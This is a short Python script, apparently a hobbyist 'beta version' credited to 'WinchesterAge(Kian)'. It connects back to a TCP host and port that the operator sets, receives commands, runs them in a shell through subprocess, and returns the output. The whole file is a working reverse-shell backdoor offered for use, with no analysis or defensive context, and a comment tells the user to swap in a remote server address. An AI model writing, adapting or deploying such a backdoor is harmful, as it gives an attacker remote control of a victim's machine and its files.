from socket import *

import subprocess

import os

print("beta version...")

s = socket(AF_INET, SOCK_STREAM)

host = 'localhost' #add sever TCP Ip & port insted of host and port 

port = 1111

try:
   port = int(port)
except:
    port = input('port must be an integer')


s.connect((host, port))
while True:
    directory = os.getcwd() + '>'
    s.send(directory.encode())
    command = s.recv(1024).decode()
    if command == 'none':
        continue
    if command[0:2] == 'cd':
        try:
            os.chdir(command[3:])
        except:
            s.send('somthing is not working')
        # if command[0:5] == 'rmdir':

    Do = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    data = Do.stderr.read()+Do.stdout.read()
    if data.decode() == '' or data.decode() == None or data.decode() == '\n':
        s.send("it's done!!!!".encode())
        continue
    s.send(data)

#By WinchesterAge(Kian)